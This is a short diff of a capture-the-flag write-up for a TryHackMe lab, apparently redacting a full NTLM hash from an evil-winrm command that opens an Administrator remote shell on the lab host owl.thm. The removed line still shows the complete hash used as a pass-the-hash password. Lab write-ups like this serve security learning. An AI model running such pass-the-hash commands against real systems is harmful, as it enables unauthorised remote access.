@@ -1206,7 +1206,7 @@ Jareth:1001:aad...5a:::
 ### evil-winrm - get admin remote
 ```bash
 ┌──(kali㉿kali)-[~/tryhackme/yearOfTheOwl]
-└─$ evil-winrm -i owl.thm -u Administrator -p 'aad3b435b51404eeaad3b435b51404ee:6bc99ede9edcfecf9662fb0c0ddcfa7a'
+└─$ evil-winrm -i owl.thm -u Administrator -p 'aad...a7a'
                                         
 Evil-WinRM shell v3.7
                                         
